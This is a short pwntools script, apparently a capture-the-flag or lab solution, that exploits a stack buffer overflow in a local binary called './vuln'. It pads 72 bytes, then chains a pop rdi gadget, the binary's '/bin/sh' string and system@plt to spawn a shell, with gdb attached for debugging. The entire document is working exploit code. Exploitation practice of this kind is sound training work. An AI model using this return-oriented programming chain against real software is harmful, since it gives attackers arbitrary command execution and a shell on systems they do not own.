from pwn import *
context.binary = elf = ELF("./vuln")

pop_rdi = p64(0x000000000040126b)
bin_sh = p64(next(elf.search(b'/bin/sh')))
system = p64(elf.plt['system'])

payload = b"A"*72
payload += pop_rdi
payload += bin_sh
payload += system

io = elf.process()
gdb.attach(io,"b *getInput+34")
io.sendline(payload)
io.interactive()
